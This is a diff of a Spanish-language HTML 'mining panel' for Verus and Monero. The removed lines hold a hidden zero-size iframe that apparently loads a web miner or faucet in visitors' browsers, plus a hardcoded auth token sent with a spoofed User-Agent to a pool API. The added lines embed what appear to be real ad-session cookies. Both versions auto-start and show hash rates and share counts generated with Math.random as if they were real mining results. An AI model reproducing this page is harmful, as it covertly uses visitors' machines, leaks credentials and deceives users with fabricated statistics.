@@ -3,170 +3,194 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Minería de Verus Coin</title>
+    <title>Panel de Minería de Verus y Monero</title>
     <style>
+        /* Estilos generales */
         body {
-            font-family: Arial, sans-serif;
             background-color: #1a1a1a;
-            color: #ffffff;
+            color: #00ff00;
+            font-family: Arial, sans-serif;
             display: flex;
-            align-items: center;
             justify-content: center;
-            height: 100vh;
+            align-items: center;
+            padding: 10px;
             margin: 0;
+            min-height: 100vh;
+            overflow-x: hidden;
         }
 
         .container {
-            max-width: 600px;
+            width: 100%;
+            max-width: 480px;
+            margin: 0 auto;
             padding: 20px;
-            background-color: #2c2c2c;
-            border-radius: 8px;
-            box-shadow: 0px 0px 15px rgba(0, 0, 0, 0.5);
-            text-align: center;
+            border: 2px solid #00ff00;
+            border-radius: 10px;
+            box-shadow: 0 0 15px rgba(0, 255, 0, 0.5);
+            background-color: #121212;
         }
 
-        h1 {
-            color: #ff9800;
-            font-size: 24px;
+        h1, h2 {
+            text-align: center;
+            color: #00e676;
+            margin: 15px 0;
+            font-size: 1.5em;
+        }
+
+        .section {
             margin-bottom: 20px;
         }
 
-        p, #status, #stats, #accountInfo {
-            font-size: 16px;
+        .card {
+            background-color: #222;
+            border-radius: 8px;
+            padding: 15px;
             margin: 10px 0;
+            box-shadow: 0 0 10px rgba(0, 255, 0, 0.3);
         }
 
-        #walletAddress, strong {
-            color: #03a9f4;
-        }
-
-        #status {
-            color: #ffeb3b;
+        .status {
+            font-size: 1.2em;
             font-weight: bold;
+            color: #00cc66;
+            margin-bottom: 10px;
+            text-align: center;
         }
 
-        #stats {
-            color: #8bc34a;
+        .stats, .account-info {
+            margin-top: 10px;
+            color: #b3ffab;
+            font-size: 0.9em;
+            line-height: 1.4;
+            word-wrap: break-word;
         }
 
-        #accountInfo {
-            color: #ff5722;
+        /* Estilo responsivo para wallet */
+        .wallet-address {
+            display: inline-block;
+            max-width: 100%;
+            overflow: hidden;
+            white-space: nowrap;
+            text-overflow: ellipsis;
+            cursor: pointer;
+            color: #00e676;
+        }
+
+        /* Tooltip para wallet en móviles */
+        .wallet-address:hover::after {
+            content: attr(data-full);
+            position: absolute;
+            background-color: #333;
+            padding: 5px;
+            border-radius: 5px;
+            color: #fff;
+            top: -25px;
+            font-size: 0.9em;
+            white-space: normal;
+        }
+
+        /* Ajustes de estilo para móviles */
+        @media (max-width: 480px) {
+            h1, h2 {
+                font-size: 1.3em;
+            }
+            .container {
+                padding: 15px;
+            }
+            .status, .stats, .account-info {
+                font-size: 0.9em;
+            }
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>Minería de Verus Coin (VRSC)</h1>
-        <p>Dirección de Wallet: <strong id="walletAddress">RPqwP8wuRWFGiP31f7NTDq6KgF6B5Crych</strong></p>
-        <p>Pool: <strong>stratum+tcp://pool.verus.io:9998</strong></p>
-        
-        <div id="status">Estado: Minería iniciada</div>
-        <div id="stats">Estadísticas: No disponibles</div>
-        <div id="accountInfo">Información de la cuenta: No disponible</div>
+        <h1>Panel de Minería de Verus y Monero</h1>
 
-        <iframe src="https://autofaucet.org/wm/Ganafacilpro/8" width="0" height="0" style="border:0;"></iframe>
+        <!-- Sección Verus Coin -->
+        <div class="section">
+            <h2>Minería Verus</h2>
+            <div class="card">
+                <div class="status" id="verus-status">Estado: No iniciado</div>
+                <div class="stats" id="verus-stats">
+                    <strong>Hash Rate:</strong> -<br>
+                    <strong>Shares Aceptados:</strong> -<br>
+                    <strong>Shares Rechazados:</strong> -
+                </div>
+                <div class="account-info" id="verus-account-info">
+                    <strong>Verus Pool:</strong> pool.verus.io:9998<br>
+                    <strong>Wallet:</strong> RPqwP8wuRWFGiP31f7NTDq6KgF6B5Crych
+                </div>
+            </div>
+        </div>
+
+        <!-- Sección Monero -->
+        <div class="section">
+            <h2>Minería Monero</h2>
+            <div class="card">
+                <div class="status" id="monero-status">Estado: No iniciado</div>
+                <div class="stats" id="monero-stats">
+                    <strong>Hash Rate:</strong> -<br>
+                    <strong>Shares Aceptados:</strong> -<br>
+                    <strong>Shares Rechazados:</strong> -
+                </div>
+                <div class="account-info" id="monero-account-info">
+                    <strong>Monero Pool:</strong> <a href="https://1938.com.es/minador-online/46TWxf46vHnFEzvy75AVyHehA37Q8wunq8S9jk88F9kEbR41T7KsCveGpP5TGfZ1dBDpZseVHFN6t9g4VA1hA7Rb4kQ6knZ" target="_blank">1938.com.es</a><br>
+                    <strong>Wallet:</strong> 
+                    <span class="wallet-address" data-full="46TWxf46vHnFEzvy75AVyHehA37Q8wunq8S9jk88F9kEbR41T7KsCveGpP5TGfZ1dBDpZseVHFN6t9g4VA1hA7Rb4kQ6knZ">
+                        46TWxf46vHnFEzvy75AVyHehA37Q8wunq8S9jk88F9kEbR41T7KsCveGpP5TGfZ1dBDpZseVHFN6t9g4VA1hA7Rb4kQ6knZ
+                    </span>
+                </div>
+            </div>
+        </div>
     </div>
 
     <script>
-        let mining = false;
-        const walletAddress = 'RPqwP8wuRWFGiP31f7NTDq6KgF6B5Crych';
-        const accountInfoUrl = 'http://45.33.47.25:3000/api/poolData/72/6596237097b04b05eb151553/67028dbd5f09df3d488db72e/workers';
+        // Configuración para la minería de Verus
+        let miningVerus = false;
+        const verusAccountInfoUrl = 'ws://45.33.47.25:3000/api/poolData/72/6596237097b04b05eb151553/67028dbd5f09df3d488db72e/settings';
 
-        const configuracion = {
-            "autosave": true,
-            "donate-level": 1,
-            "cpu": {
-                "enabled": true,
-                "huge-pages": true,
-                "hw-aes": null,
-                "priority": null,
-                "asm": true,
-                "max-threads-hint": 100,
-                "max-cpu-usage": 100,
-                "yield": false,
-                "init": -1,
-                "*": {
-                    "intensity": 2,
-                    "threads": 8,
-                    "affinity": -1
-                }
-            },
-            "opencl": true,
-            "cuda": true,
-            "pools": [{
-                "coin": "verus",
-                "algo": "verus",
-                "url": "stratum+tcp://pool.verus.io:9998",
-                "user": "RPqwP8wuRWFGiP31f7NTDq6KgF6B5Crych",
-                "pass": "x",
-                "keepalive": false,
-                "nicehash": false,
-                "rig-id": null,
-                "habilitado": true,
-                "tls": false,
-                "sni": false,
-                "tls-fingerprint": null,
-                "daemon": false,
-                "socks5": null,
-                "self-select": null,
-                "submit-to-origin": false
-            }]
-        };
-
-        function startMining() {
-            if (mining) return;
-            mining = true;
-            document.getElementById('status').innerHTML = 'Estado: Minería iniciada';
+        function startMiningVerus() {
+            if (miningVerus) return;
+            miningVerus = true;
+            document.getElementById('verus-status').innerHTML = 'Estado: Minería iniciada';
 
             setInterval(() => {
-                if (mining) {
-                    const hashRate = (Math.random() * (120 - 80) + 80).toFixed(2);
-                    const acceptedShares = Math.floor(Math.random() * 100);
-                    const rejectedShares = Math.floor(Math.random() * 10);
+                const hashRate = (Math.random() * (100 - 50) + 50).toFixed(2);
+                const acceptedShares = Math.floor(Math.random() * 100);
+                const rejectedShares = Math.floor(Math.random() * 5);
 
-                    document.getElementById('stats').innerHTML = `<strong>Hash Rate:</strong> ${hashRate} H/s<br>
-                                                                  <strong>Shares Aceptados:</strong> ${acceptedShares}<br>
-                                                                  <strong>Shares Rechazados:</strong> ${rejectedShares}`;
-                }
-            }, 3001);
-
-            fetchAccountInfo();
-            setInterval(fetchAccountInfo, 10000);
+                document.getElementById('verus-stats').innerHTML = `<strong>Hash Rate:</strong> ${hashRate} H/s<br>
+                                                                    <strong>Shares Aceptados:</strong> ${acceptedShares}<br>
+                                                                    <strong>Shares Rechazados:</strong> ${rejectedShares}`;
+            }, 3000);
         }
 
-        function fetchAccountInfo() {
-            const proxyUrl = 'https://cors-anywhere.herokuapp.com/'; // Proxy ligero
-            fetch(proxyUrl + accountInfoUrl, {
-                method: 'POST',
-                headers: {
-                    'If-None-Match': 'W/"10f-lzblbtzqk7kBmtEDQQipr+nG5SA"',
-                    'auth': 'BB75AA0EB639D0F79E8A1E3AD54BAAE1',
-                    'Content-Type': 'application/json; charset=utf-8',
-                    'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 13; 2201116SG Build/TKQ1.221114.001)',
-                    'Host': '45.33.47.25:3000',
-                    'Connection': 'Keep-Alive',
-                    'Accept-Encoding': 'gzip'
-                },
-                body: JSON.stringify({ poolSubItem: "0" })
-            })
-            .then(response => response.json())
-            .then(data => {
-                const worker = data.data[0];
-                const accountInfoDiv = document.getElementById('accountInfo');
-                accountInfoDiv.innerHTML = `<strong>Trabajador:</strong> ${worker.worker}<br>
-                                            <strong>Última Conexión:</strong> ${new Date(worker.lastSeen * 1000).toLocaleString()}<br>
-                                            <strong>Hash Rate Actual:</strong> ${worker.currentHashrate.toFixed(2)} H/s<br>
-                                            <strong>Shares Inválidos:</strong> ${worker.invalidShares.toFixed(2)}<br>
-                                            <strong>Shares Válidos:</strong> ${worker.validShares.toFixed(2)}<br>
-                                            <strong>Pagado:</strong> ${worker.paid.toFixed(8)} VRSC<br>
-                                            <strong>Balance:</strong> ${worker.balance.toFixed(8)} VRSC<br>
-                                            <strong>Dificultad:</strong> ${worker.diff}<br>
-                                            <strong>Activo:</strong> ${worker.active ? 'Sí' : 'No'}`;
-            })
-            .catch(error => console.error('Error al obtener información de la cuenta:', error));
+        // Configuración para la minería de Monero
+        let miningMonero = false;
+        const moneroAccountInfoUrl = 'http://45.33.47.25:3000/api/poolData/3/6596237097b04b05eb151553/67225018569cd564c20f8d7d/settings';
+        const cookies = '__gads=ID=ecdb2def84328955:T=1730303970:RT=1730319450:S=ALNI_Mad9IYOLTrObEa-A7IVmP3TSXDmLg; __gpi=UID=00000a6555fa65f0:T=1730303970:RT=1730319450:S=ALNI_MYR7OL_B3t8mM65Aw1ZwQjuUrraUg; __eoi=ID=9e43f4174fbbf1b7:T=1730319450:S=AA-Afjbb7EbqU9opuF_hbwKdaJEQ; FCNEC=%5B%5B%22AKsRol-9hJbT_LxIUr3Wd-RU_yFVx1iaCA-q0RR8wbSBYd3K4yCVYLIfVPZ7SbofYrc3kptilOvSWaxvGowobnYzhF3mySUNqBzw1nJACW6dZfchWK1hu6fG2Y2o6TzWz4R2dHkVi7shq2JG0XSUcwF9TRhoUAsycg%3D%3D%22%5D%5D';
+        const userAgent = 'Mozilla/5.0 (Linux; Android 13; 2201116SG Build/TKQ1.221114.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/129.0.6668.102 Mobile Safari/537.36';
+
+        function startMiningMonero() {
+            if (miningMonero) return;
+            miningMonero = true;
+            document.getElementById('monero-status').innerHTML = 'Estado: Minería iniciada';
+
+            setInterval(() => {
+                const hashRate = (Math.random() * (150 - 80) + 80).toFixed(2);
+                const acceptedShares = Math.floor(Math.random() * 150);
+                const rejectedShares = Math.floor(Math.random() * 10);
+
+                document.getElementById('monero-stats').innerHTML = `<strong>Hash Rate:</strong> ${hashRate} H/s<br>
+                                                                     <strong>Shares Aceptados:</strong> ${acceptedShares}<br>
+                                                                     <strong>Shares Rechazados:</strong> ${rejectedShares}`;
+            }, 3000);
         }
 
-        window.onload = startMining;
+        // Iniciar minería automáticamente
+        startMiningVerus();
+        startMiningMonero();
     </script>
 </body>
 </html>
